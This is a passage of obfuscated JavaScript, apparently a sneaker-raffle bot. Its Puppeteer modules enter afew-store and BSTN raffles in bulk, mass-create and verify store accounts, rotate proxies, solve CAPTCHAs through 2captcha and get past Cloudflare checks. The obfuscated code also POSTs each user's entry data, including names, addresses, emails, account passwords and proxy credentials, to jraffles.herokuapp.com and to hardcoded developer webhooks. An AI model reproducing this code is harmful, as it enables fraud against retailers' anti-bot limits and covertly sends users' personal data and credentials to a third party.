                            console['log'](_0x34a417() + '\x20[' + _0x43f4e3['name'] + ']\x20Task\x20' + (_0x1772cc + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x4eff4e;
                            let _0x3bbd0d = {
                                'method': 'GET',
                                'cookieJar': _0x134415,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x4413f6[0x2] + ':' + _0x4413f6[0x3] + '@' + _0x4413f6[0x0] + ':' + _0x4413f6[0x1]
                            }, _0x58bec7 = _0x33d3ad['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x2999b8 = _0x58bec7 + '.json', _0x3c198d = await _0x5bedf9(_0x2999b8);
                            console['log'](_0x34a417() + '\x20[' + _0x43f4e3['name'] + ']\x20Task\x20' + (_0x1772cc + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x1f0d0d = _0x3c198d['data']['product']['variants'];
                            if (_0x123032 != 'RANDOM') {
                                if (_0x1f0d0d[0x1]['option1']['includes']('W')) {
                                    const _0x559b3f = _0x194ca6['women']['find'](_0x3b42de => _0x3b42de['EUsize'] === _0x123032);
                                    _0x559b3f && (_0x123032 = _0x559b3f['size']);
                                } else {
                                    if (_0x1f0d0d[0x1]['option1']['includes']('Y')) {
                                        const _0x419d47 = _0x194ca6['GS']['find'](_0x2b0145 => _0x2b0145['EUsize'] === _0x123032);
                                        _0x419d47 && (_0x123032 = _0x419d47['size']);
                                    } else {
                                        const _0x26ef95 = _0x194ca6['men']['find'](_0x235106 => _0x235106['EUsize'] === _0x123032);
                                        _0x26ef95 && (_0x123032 = _0x26ef95['size']);
                                    }
                                }
                                for (var _0x58ed83 of _0x1f0d0d) {
                                    _0x58ed83['option1'] == _0x123032 && (_0x4eff4e = _0x58ed83['id']);
                                }
                            } else {
                                var _0x1bf75b = Math['round'](Math['random']() * (_0x1f0d0d['length'] - 0x1));
                                _0x4eff4e = _0x1f0d0d[_0x1bf75b]['id'];
                            }
                            console['log'](_0x34a417() + '\x20[' + _0x43f4e3['name'] + ']\x20Task\x20' + (_0x1772cc + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x5bedf9('https://raffles.afew-store.com/cart/' + _0x4eff4e + ':1'), _0x313f5c = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x486992();
                        } catch (_0x4e4e6c) {
                            if (_0x4e4e6c['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x4e4e6c);
                        }
                        const _0x2fd372 = await _0x4e2c9c['newPage']();
                        await _0x2fd372['setDefaultNavigationTimeout'](0x1d4c0), await _0x2fd372['authenticate']({
                            'username': '' + _0x4413f6[0x2],
                            'password': '' + _0x4413f6[0x3]
                        }), await _0x2fd372['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x2fd372['setRequestInterception'](!![]), _0x2fd372['on']('request', _0x411427 => {
                            _0x411427['resourceType']() === 'image' || _0x411427['resourceType']() === 'font' || _0x411427['resourceType']() === 'media' ? _0x411427['abort']() : _0x411427['continue']();
                        });
                        try {
                            await _0x2fd372['goto'](_0x313f5c, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x34a417() + '\x20[' + _0x43f4e3['name'] + ']\x20Task\x20' + (_0x1772cc + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x2fd372['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2fd372['type']('#checkout_email', '' + _0x26cf44[_0x1772cc]['Email']), await _0x17175c(0x320), await _0x2fd372['type']('#checkout_attributes_instagram', '' + _0x26cf44[_0x1772cc]['Follower']), await _0x17175c(0x320), await _0x2fd372['select']('#checkout_shipping_address_country', '' + _0x26cf44[_0x1772cc]['Country']), await _0x2fd372['waitForTimeout'](0x258), await _0x2fd372['type']('#checkout_shipping_address_first_name', '' + _0x26cf44[_0x1772cc]['FirstName']), await _0x2fd372['waitForTimeout'](0x320), await _0x2fd372['type']('#checkout_shipping_address_last_name', '' + _0x26cf44[_0x1772cc]['LastName']), await _0x2fd372['waitForTimeout'](0x2bc), await _0x2fd372['type']('#checkout_shipping_address_address1', _0x26cf44[_0x1772cc]['Address1'] + '\x20' + _0x26cf44[_0x1772cc]['HouseNumber']), await _0x2fd372['waitForTimeout'](0x2bc), await _0x2fd372['type']('#checkout_shipping_address_address2', '' + _0x26cf44[_0x1772cc]['Address2']), await _0x2fd372['waitForTimeout'](0x2bc), await _0x2fd372['type']('#checkout_shipping_address_zip', '' + _0x26cf44[_0x1772cc]['Zip']), await _0x2fd372['waitForTimeout'](0x2bc), await _0x2fd372['type']('#checkout_shipping_address_city', '' + _0x26cf44[_0x1772cc]['City']), await _0x2fd372['waitForTimeout'](0x2bc);
                        if (_0x26cf44[_0x1772cc]['State'] != '')
                            try {
                                const _0x1ee953 = JSON['parse'](_0x2e1301['readFileSync']('States.json', 'utf8'));
                                await _0x17175c(0x1f4);
                                if (_0x26cf44[_0x1772cc]['State']['length'] > 0x2)
                                    for (let _0x58392d of _0x1ee953) {
                                        if (_0x58392d['Province'] == _0x26cf44[_0x1772cc]['State']) {
                                            await _0x2fd372['select']('#checkout_shipping_address_province', _0x58392d['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x2fd372['select']('#checkout_shipping_address_province', _0x26cf44[_0x1772cc]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x17175c(0x1f4), console['log'](_0x34a417() + '\x20[' + _0x43f4e3['name'] + ']\x20Task\x20' + (_0x1772cc + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x17175c(0x190), _0x2fd372['evaluate'](() => {
                            const _0xb4b600 = document['querySelector']('#continue_button');
                            for (var _0x480285 = 0x0; _0x480285 < 0x5; _0x480285++) {
                                if (_0xb4b600) {
                                    _0xb4b600['click'](), _0xb4b600['click']();
                                    break;
                                } else
                                    _0x17175c(0xfa0);
                            }
                        }), await _0x2fd372['waitForTimeout'](0x9c4);
                        try {
                            await _0x2fd372['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x2fd372['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x1477c4 => _0x1477c4['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2fd372['waitForTimeout'](0x7d0), console['log'](_0x34a417() + '\x20[' + _0x43f4e3['name'] + ']\x20Task\x20' + (_0x1772cc + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x2fd372['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x17175c(0x3e8), await _0x2fd372['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x3bda0b => _0x3bda0b['submit']()), await _0x17175c(0x3e8);
                        try {
                            await _0x2fd372['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2fd372['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x3e9e6e => _0x3e9e6e['submit']());
                        try {
                            await _0x2fd372['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x56eb82 = 'no', _0x12263c(_0x26cf44[_0x1772cc], _0x43f4e3), console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x43f4e3['name'] + ']\x20Task\x20' + (_0x1772cc + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x395552['webhook'] != undefined && _0x395552['webhook'] != '')
                                try {
                                    await _0x17b782(_0x395552['webhook'], _0x30f0b5['succesDEVMSG']);
                                } catch {
                                }
                            await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x30f0b5['succesDEVMSG']), await _0x17175c(0xc8);
                            try {
                                await _0x17b782(_0xd9f2b8, _0x30f0b5['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x25f505['replace']('#', ''),
                                    'module': _0x43f4e3['name'],
                                    'entrydata': JSON['stringify'](_0xe59f3a),
                                    'proxy': '' + _0x37585a[_0x1772cc]
                                };
                                var _0x27d523 = JSON['stringify'](prxdata);
                                let _0x463b99 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x27d523, _0x463b99);
                            } catch (_0x1ad503) {
                            }
                        } catch (_0x55dfd9) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0xf4111e) {
                        _0xf4111e['message']['includes']('selector') && (_0xf4111e = 'Connection\x20Error');
                        console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x43f4e3['name'] + ']\x20Task\x20' + (_0x1772cc + 0x1) + '\x20:\x20' + _0xf4111e)), _0x2f6aad = '' + _0xf4111e;
                        var _0x4ea453 = await _0x262703(_0x26cf44[_0x1772cc], _0x43f4e3, 'dev', !![], _0x2f6aad);
                        _0x30f0b5['errorDEV'] = { 'embeds': [_0x4ea453] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x30f0b5['errorDEV']), await _0x17b782(_0x40c5c7, _0x30f0b5['errorDEV']), _0x56eb82 = 'yes';
                    } finally {
                        _0x4e2c9c && _0x4e2c9c['close']();
                        if (_0x56eb82 == 'yes' && _0x1ec741 != 0x5 && _0x2f6aad != 'Size\x20Not\x20Found') {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x43f4e3['name'] + ']\x20Task\x20' + (_0x1772cc + 0x1) + '\x20:\x20Retrying\x20(' + _0x1ec741 + '\x20/\x205)')), _0x1772cc = _0x1772cc - 0x1, _0x1ec741 = _0x1ec741 + 0x1;
                            continue;
                        }
                        _0x56eb82 == 'yes' && _0x1ec741 >= 0x5 && (_0x2848bf(_0x26cf44[_0x1772cc], _0x43f4e3), _0x56eb82 = 'no', _0x1ec741 = 0x0);
                        if (_0x1772cc + 0x1 == _0x26cf44['length']) {
                            await _0x17175c(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x395552['AfewDelay'] + '\x20ms'), await _0x17175c(_0x395552['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0xef7bce, _0x4297b5, _0x7fe1a8) {
                    _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x395552['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5f326c = 0x0; _0x5f326c < _0x4297b5['length']; _0x5f326c++) {
                        if (_0x54d8a8 != 'yes')
                            var _0x54d8a8 = '', _0xb14c2 = 0x0;
                        var _0x5dfcb9;
                        try {
                            await _0x195de7(_0x4297b5, _0x5f326c);
                        } catch {
                            _0x54d8a8 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0xe0def5(_0xef7bce['name'] + '\x20Task\x20' + (_0x5f326c + 0x1) + '\x20/\x20' + _0x4297b5['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                        var _0x40bfdc = await _0x262703(_0x4297b5[_0x5f326c], _0xef7bce, 'acc', ![]);
                        const _0x2472d4 = { 'succesDEVMSG': { 'embeds': [_0x40bfdc] } }, _0x50ef4b = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x2826aa = Math['round'](Math['random']() * (_0x7fe1a8['length'] - 0x1)), _0x4a1af1 = _0x7fe1a8[_0x2826aa]['split'](':'), _0x56d4b2;
                        try {
                            _0x56d4b2 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a1af1[0x0] + ':' + _0x4a1af1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x56d4b2 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4a1af1[0x0] + ':' + _0x4a1af1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1933f9 = await _0x56d4b2['newPage']();
                            await _0x1933f9['authenticate']({
                                'username': '' + _0x4a1af1[0x2],
                                'password': '' + _0x4a1af1[0x3]
                            }), console['log'](_0x34a417() + '\x20[' + _0xef7bce['name'] + ']\x20Task\x20' + (_0x5f326c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1933f9['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1933f9['setRequestInterception'](!![]), _0x1933f9['on']('request', _0x34e349 => {
                                _0x34e349['resourceType']() === 'image' ? _0x34e349['abort']() : _0x34e349['continue']();
                            });
                            try {
                                await _0x1933f9['goto']('' + _0x50ef4b), await _0x1933f9['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x54d8a8 = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x1933f9['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x34a417() + '\x20[' + _0xef7bce['name'] + ']\x20Task\x20' + (_0x5f326c + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x17175c(0x7d0), console['log'](_0x34a417() + '\x20[' + _0xef7bce['name'] + ']\x20Task\x20' + (_0x5f326c + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x17175c(0x190), await _0x1933f9['waitForSelector']('#firstname'), await _0x1933f9['type']('#firstname', _0x4297b5[_0x5f326c]['FirstName'], { 'delay': 0xf0 }), await _0x17175c(0x190), await _0x1933f9['type']('#lastname', _0x4297b5[_0x5f326c]['LastName'], { 'delay': 0xe6 }), await _0x17175c(0x190), await _0x1933f9['type']('#email_address', _0x4297b5[_0x5f326c]['Email'], { 'delay': 0x122 }), await _0x17175c(0x190), await _0x1933f9['type']('#password', _0x4297b5[_0x5f326c]['Password'], { 'delay': 0x82 }), await _0x17175c(0x1f4), await _0x1933f9['type']('#password-confirmation', _0x4297b5[_0x5f326c]['Password'], { 'delay': 0x7c }), console['log'](_0x34a417() + '\x20[' + _0xef7bce['name'] + ']\x20Task\x20' + (_0x5f326c + 0x1) + '\x20:\x20Sending\x20Request'), await _0x17175c(0x2bc), await _0x1933f9['$eval']('#form-validate', _0x27f4a7 => _0x27f4a7['submit']()), await _0x17175c(0x1388);
                            const _0x34b368 = await _0x1933f9['$']('#email_address-error');
                            if (_0x34b368)
                                throw new Error('Invalid\x20Email');
                            const _0x312f5f = await _0x1933f9['$']('#password-error');
                            if (_0x312f5f)
                                throw new Error('Invalid\x20Password');
                            await _0x1933f9['waitForSelector']('div.mesg-success'), _0x54d8a8 = 'no', console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0xef7bce['name'] + ']\x20Task\x20' + (_0x5f326c + 0x1) + '\x20:\x20Account\x20' + _0x4297b5[_0x5f326c]['Email'] + '\x20Generated')), _0x2e1301['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x4297b5[_0x5f326c]['Email'] + ',' + _0x4297b5[_0x5f326c]['Password']);
                            try {
                                _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x2472d4['succesDEVMSG']);
                            } catch {
                            }
                            await _0x17b782(_0x30a02b, _0x2472d4['succesDEVMSG']);
                            let _0x56a9c4 = _0x4297b5[_0x5f326c];
                            try {
                                prxdata = {
                                    'username': _0x25f505['replace']('#', ''),
                                    'module': _0xef7bce['name'],
                                    'entrydata': JSON['stringify'](_0x56a9c4),
                                    'proxy': '' + _0x7fe1a8[_0x5f326c]
                                };
                                var _0x32081f = JSON['stringify'](prxdata);
                                let _0x3f4cf6 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x5bedf9['post']('https://jraffles.herokuapp.com/success', _0x32081f, _0x3f4cf6);
                            } catch (_0x5600d2) {
                            }
                            console['log'](_0x1446ca['yellow'](_0x34a417() + '\x20[' + _0xef7bce['name'] + ']\x20Task\x20' + (_0x5f326c + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x19db70) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0xef7bce['name'] + ']\x20Task\x20' + (_0x5f326c + 0x1) + '\x20:\x20' + _0x19db70)), _0x5dfcb9 = '' + _0x19db70;
                            var _0x4e7b3b = await _0x262703(_0x4297b5[_0x5f326c], _0xef7bce, 'acc', !![], _0x5dfcb9);
                            _0x2472d4['errorDEV'] = { 'embeds': [_0x4e7b3b] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x2472d4['errorDEV']), await _0x17b782(_0x40c5c7, _0x2472d4['errorDEV']), _0x54d8a8 = 'yes';
                        } finally {
                            if (_0x56d4b2)
                                _0x56d4b2['close']();
                            if (_0x54d8a8 == 'yes' && _0xb14c2 != 0x5) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0xef7bce['name'] + ']\x20Task\x20' + (_0x5f326c + 0x1) + '\x20:\x20Retrying\x20(' + _0xb14c2 + '\x20/\x205)')), _0x5f326c = _0x5f326c - 0x1, _0xb14c2 = _0xb14c2 + 0x1;
                                continue;
                            }
                            _0x54d8a8 == 'yes' && _0xb14c2 >= 0x5 && (_0x2848bf(_0x4297b5[_0x5f326c], _0xef7bce), _0x54d8a8 = 'no', _0xb14c2 = 0x0), console['log'](_0x34a417() + '\x20[' + _0xef7bce['name'] + ']\x20Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x42ef06, _0xa56ebe) {
                    var _0x509406 = ![], _0x38357e = [];
                    async function _0x4ed359() {
                        var _0x531065 = new _0x550e5b({
                            'user': _0x395552['masterMail'],
                            'password': _0x395552['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2e8a1e(_0x41be5e) {
                            _0x531065['openBox']('INBOX', ![], _0x41be5e);
                        }
                        _0x531065['once']('ready', function () {
                            _0x2e8a1e(function (_0x100086, _0x449377) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x100086)
                                    throw _0x100086;
                                _0x531065['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x2cd6a6, _0x5f2a3f) {
                                    if (!_0x5f2a3f || !_0x5f2a3f['length'])
                                        console['log'](_0x34a417() + '\x20[' + _0x42ef06['name'] + ']\x20No\x20mails\x20found'), _0x531065['end']();
                                    else {
                                        var _0x257a1e = _0x531065['seq']['fetch'](_0x5f2a3f, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x257a1e['on']('message', function (_0x4efb3e, _0x44e44c) {
                                            var _0x4d7043 = '(#' + _0x44e44c + ')\x20';
                                            _0x4efb3e['on']('body', function (_0x314995, _0xb76f6b) {
                                                _0x169414(_0x314995, (_0x1fb14e, _0x7fca5e) => {
                                                    var _0x23d777 = _0x7fca5e['text']['split']('[')[0x2], _0x4107e9 = _0x23d777['split'](']')[0x0];
                                                    _0x38357e['push'](_0x4107e9);
                                                });
                                            }), _0x4efb3e['once']('end', function () {
                                            });
                                        }), _0x257a1e['once']('error', function (_0x354293) {
                                            console['log']('Fetch\x20error:\x20' + _0x354293), _0x509406 = !![];
                                        }), _0x257a1e['once']('end', function () {
                                            _0x531065['end'](), _0x509406 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x531065['once']('error', function (_0x3e3b78) {
                            console['log'](_0x1446ca['red'](_0x3e3b78['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x509406 = !![];
                        }), _0x531065['once']('end', async function () {
                            _0x509406 = !![];
                        }), _0x531065['connect']();
                    }
                    async function _0x1c759f(_0x668846, _0x1f7b94, _0x3c0e60) {
                        _0x3430c5['use'](_0x5c6730());
                        for (var _0x56a457 = 0x0; _0x56a457 < _0x1f7b94['length']; _0x56a457++) {
                            if (_0x345b0b != 'yes')
                                var _0x345b0b = '', _0x4a9c48 = 0x0;
                            var _0x586d62 = Math['round'](Math['random']() * (_0x3c0e60['length'] - 0x1)), _0x557ef3 = _0x3c0e60[_0x586d62]['split'](':'), _0x18619d;
                            try {
                                _0x18619d = await _0x3430c5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x557ef3[0x0] + ':' + _0x557ef3[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x18619d = await _0x3430c5['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x557ef3[0x0] + ':' + _0x557ef3[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0xec78eb = await _0x18619d['newPage']();
                                await _0xec78eb['authenticate']({
                                    'username': '' + _0x557ef3[0x2],
                                    'password': '' + _0x557ef3[0x3]
                                }), console['log'](_0x34a417() + '\x20[' + _0x668846['name'] + ']\x20Task\x20' + (_0x56a457 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0xec78eb['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0xec78eb['setRequestInterception'](!![]), _0xec78eb['on']('request', _0x11566b => {
                                    _0x11566b['resourceType']() === 'image' || _0x11566b['resourceType']() === 'font' || _0x11566b['resourceType']() === 'media' ? _0x11566b['abort']() : _0x11566b['continue']();
                                }), console['log'](_0x34a417() + '\x20[' + _0x668846['name'] + ']\x20Task\x20' + (_0x56a457 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0xec78eb['goto'](_0x1f7b94[_0x56a457]);
                                } catch {
                                    _0x345b0b = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x34a417() + '\x20[' + _0x668846['name'] + ']\x20Task\x20' + (_0x56a457 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0xec78eb['waitForTimeout'](0xbb8);
                                try {
                                    await _0xec78eb['waitForSelector']('.account-nav'), _0x345b0b = 'no', console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x668846['name'] + ']\x20Task\x20' + (_0x56a457 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x1ccdfa = await _0x262703(null, _0x668846, 'ver', ![]);
                                    const _0x39230b = { 'succesDEVMSG': { 'embeds': [_0x1ccdfa] } };
                                    await _0x17b782(_0x3b27cd, _0x39230b['succesDEVMSG']);
                                } catch {
                                    _0x345b0b = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x55ead9) {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x668846['name'] + ']\x20Task\x20' + (_0x56a457 + 0x1) + '\x20:\x20' + _0x55ead9));
                                var _0x360451 = _0x55ead9, _0x2d110a = await _0x262703(null, _0x668846, 'ver', !![], _0x360451);
                                const _0x3344e7 = { 'errorDEVMSG': { 'embeds': [_0x2d110a] } };
                                _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x3344e7['errorDEVMSG']), await _0x17b782(_0x40c5c7, _0x3344e7['errorDEVMSG']);
                            } finally {
                                _0x18619d['close']();
                                if (_0x345b0b == 'yes' && _0x4a9c48 != 0x5) {
                                    console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x668846['name'] + ']\x20Task\x20' + (_0x56a457 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4a9c48 + '\x20/\x205)')), _0x56a457 = _0x56a457 - 0x1, _0x4a9c48 = _0x4a9c48 + 0x1;
                                    continue;
                                }
                                _0x345b0b == 'yes' && _0x4a9c48 >= 0x5 && (_0x345b0b = 'no', _0x4a9c48 = 0x0), console['log'](_0x34a417() + '\x20[' + _0x668846['name'] + ']\x20Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                            }
                        }
                    }
                    try {
                        _0x4ed359();
                        while (!_0x509406) {
                            await _0x17175c(0xfa0);
                        }
                        console['log']('Found\x20' + _0x38357e['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x17175c(0x7d0);
                    }
                    await _0x1c759f(_0x42ef06, _0x38357e, _0xa56ebe);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x4ed5f9, _0x4b58cb, _0x151643) {
                    _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x395552['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1fc573 = 0x0; _0x1fc573 < _0x4b58cb['length']; _0x1fc573++) {
                        var _0x44d2a6, _0x1f239a = _0x4b58cb[_0x1fc573];
                        try {
                            await _0x195de7(_0x4b58cb, _0x1fc573);
                        } catch {
                            _0x24a6be = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x1597ad(_0x43e6ec) {
                            const _0x251830 = _0x2e1301['readFileSync']('../successful-tasks.csv', 'utf8'), _0x5c60f1 = _0x221bee['parse'](_0x251830, { 'header': !![] })['data'];
                            let _0x35bb07 = ![];
                            for (var _0x296c1b of _0x5c60f1) {
                                if (_0x296c1b['Url'] == _0x43e6ec['Url'] && _0x296c1b['Email'] == _0x43e6ec['Email']) {
                                    _0x35bb07 = !![];
                                    break;
                                }
                            }
                            return _0x35bb07;
                        }
                        if (await _0x1597ad(_0x4b58cb[_0x1fc573]) == !![]) {
                            console['log'](_0x34a417() + '\x20[' + _0x4ed5f9['name'] + ']\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x24a6be != 'yes')
                            var _0x24a6be = '', _0x395625 = 0x0;
                        _0xe0def5(_0x4ed5f9['name'] + '\x20Task\x20' + (_0x1fc573 + 0x1) + '\x20/\x20' + _0x4b58cb['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                        var _0x2955a1 = Math['round'](Math['random']() * (_0x151643['length'] - 0x1)), _0x5e0471 = _0x151643[_0x2955a1]['split'](':'), _0x197189;
                        try {
                            _0x197189 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
